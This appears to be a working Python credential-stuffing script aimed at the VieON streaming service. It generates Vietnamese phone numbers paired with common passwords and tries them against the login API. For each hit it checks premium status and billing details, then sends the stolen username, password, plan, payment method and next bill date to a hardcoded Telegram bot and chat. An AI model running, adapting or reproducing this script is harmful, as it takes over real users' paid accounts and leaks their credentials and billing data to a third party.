import requests
import random
import telebot
import os
import time
import uuid


user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

while True:
    device_id =  f'"{uuid.uuid4()}"'
    pre = None
    trial = None
    profile_token = None
    subscription_use = None
    user_id =None
    # Lấy Access Token
    login_url = f"https://api.vieon.vn/backend/user/v2/login?platform=web&ui=012021"
    token_url = f"https://api.vieon.vn/backend/user/login/anonymous?platform=web&ui=012021"
    login_data = f"device_id={device_id}&model=Windows%2010&platform=web&ui=012021"

    headers = {
        "User-Agent": user_agent,
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://vieon.vn",
        "Referer": "https://vieon.vn/auth/?destination=/&page=/",
        "Sec-Ch-Ua": '"Not A;Brand";v="99", "Chromium";v="96"',
    }

    try:
        response = requests.post(token_url, data=login_data, headers=headers)
        response.raise_for_status()
        response_data = response.json()
        access_token = response_data.get("access_token")

        if not os.path.exists("gen.txt"):
            with open("gen.txt","w") as file :
                file.write("")
        with open('gen.txt', 'r') as file:
            lines = file.readlines()
            if len(lines) > 0:
                user, password = lines[0].strip().split(':')
                lines = lines[1:]
                with open('gen.txt', 'w') as file:
                    file.writelines(lines)
            else:
                user = None
                password = None
        # Gen sdt
        with open('gen.txt', 'a') as file:
            prefix_list = ['098', '038', '035', '036', '037', '090', '093', '081', '082', '083', '084', '085', '091', '094']
            prefix = random.choice(prefix_list)
            random_number = ''.join([str(random.randint(0, 9)) for _ in range(7)])
            suffix_list = ['123456', '12345678', '123456789', '123456', '012345',f'{random_number}','111111']
            suffix = random.choice(suffix_list)
            phone_number = f'{prefix}{random_number}:{suffix}\n'
            file.write(phone_number)
        headers = {
         'authority': 'api.vieon.vn',
         'authorization': access_token,
         'content-type': 'application/json',
         'user-agent': user_agent,
       }
        json_data = {
         'username': user,
         'country_code': 'VN',
         'model': 'Windows 10',
         'device_id': device_id,
         'device_name': 'Edge/119',
         'device_type': 'desktop',
         'platform': 'web',
         'ui': '012021',
       }

        response = requests.post('https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021',headers=headers, json=json_data)
        abv = response.json()
        code = abv.get("code")
        if code ==4009 :
            login_data = {
                "username": user,
                "password": password,
                "country_code": "VN",
                "model": "Android 5.1.1",
                "device_id": device_id,
                "device_name": "Chrome/96",
                "device_type": "desktop",
                "platform": "mobile_web",
                "ui": "012021"
            }
            headers = {
                "User-Agent": user_agent,
                "Authorization" : access_token,
            }
            response = requests.post(login_url, json=login_data, headers=headers)
            response.raise_for_status()
            response_data = response.json()
            code = response_data.get("code")
            if code == 0:
                data = response.json()
                access_token = data["result"]["access_token"]
                is_premium = data["result"]["profile"]["is_premium"]
                id = data["result"]["profile"]["id"]
            if code == 0 and is_premium == 1:
                print("Đăng Nhập Thành Công", user, ":", password,"is Premium: YES")
                check_data = f"device_id={device_id}&model=Windows%2010&platform=web&ui=012021"
                headerscheck = {
                "Content-Type": "application/json, text/plain, */*",
                "Referer": "https://vieon.vn/ca-nhan/",
                "User-Agent" : user_agent,
                "Profile-Token": profile_token,
                "Authorization": access_token,
             }
                response = requests.get("https://api.vieon.vn/backend/billing/purchased-services?platform=web&ui=012021",data = check_data, headers=headerscheck)
                data = response.json()
                print(data)
                subscription_use= data.get("subscription_use", {})
                items = subscription_use.get("items", [])
                for item in items:
                 name = item.get("name")
                 han = item.get("expired_date")
                 pay = item.get("payment_method")
                 giahan = item.get("next_recurring_date")

                print(name, " Hạn: ",han)
            if code != 400:
                bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
                bot = telebot.TeleBot(bot_token)
                chat_id = '-1001878033586' 
                mess = f'''SUCCESS VIEON ✅
{user}:{password}
Plan: {name}
Date: {han}
Method Pay: {pay}
Next Bill: {giahan}
Bot By: VannQuoc? aka @Monleohaykhok
'''
                bot.send_message(chat_id, mess)
    except Exception as e:
        print(f'error: {e}, type: {type(e)}')
    time.sleep(150)